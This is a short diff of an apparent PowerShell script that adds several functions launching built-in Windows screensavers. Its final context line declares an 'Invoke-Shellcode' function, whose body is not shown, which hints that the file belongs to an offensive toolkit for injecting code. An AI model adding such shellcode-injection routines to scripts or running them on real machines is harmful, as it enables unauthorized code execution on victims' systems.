@@ -1,6 +1,26 @@
-function scr
+function a
 {
 start $env:WINDIR/System32/Ribbons.scr /s
+}
+function b
+{
+start $env:WINDIR/System32/ssText3d.scr /s
+}
+function c
+{
+start $env:WINDIR/System32/Mystify.scr /s
+}
+function d
+{
+start $env:WINDIR/System32/Bubbles.scr /s
+}
+function e
+{
+start $env:WINDIR/System32/PhotoScreensaver.scr /s
+}
+function f
+{
+start $env:WINDIR/System32/scrnsave.scr /s
 }
 function Invoke-Shellcode
 {
